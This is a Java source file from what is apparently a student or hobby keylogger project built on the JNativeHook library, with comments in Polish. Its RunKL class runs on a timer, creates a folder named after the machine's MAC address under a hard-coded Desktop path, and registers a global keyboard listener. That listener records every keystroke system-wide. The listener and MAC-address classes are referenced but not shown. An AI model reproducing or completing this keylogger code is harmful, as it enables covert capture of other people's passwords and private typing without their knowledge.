package jnativehookexample;

import java.io.File;
import java.util.TimerTask;
import org.jnativehook.GlobalScreen;
/**
 * Klasa pomocnicza powodująca wywołanie keyloggera w określonym odstępie czasu
 * @author PanTomek
 */
public class RunKL extends TimerTask{
/**
 * funkcja wywłująca keylogger w ustalonum odstępie czasu
 */
    @Override
    public void run() {
        MACaddress mac=new MACaddress();
        String s = mac.getmac();
        File dir = new File("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\" + s);
        dir.mkdir();
        KeyListener keyListener = new KeyListener();
        GlobalScreen.addNativeKeyListener(keyListener);
    }
    
}
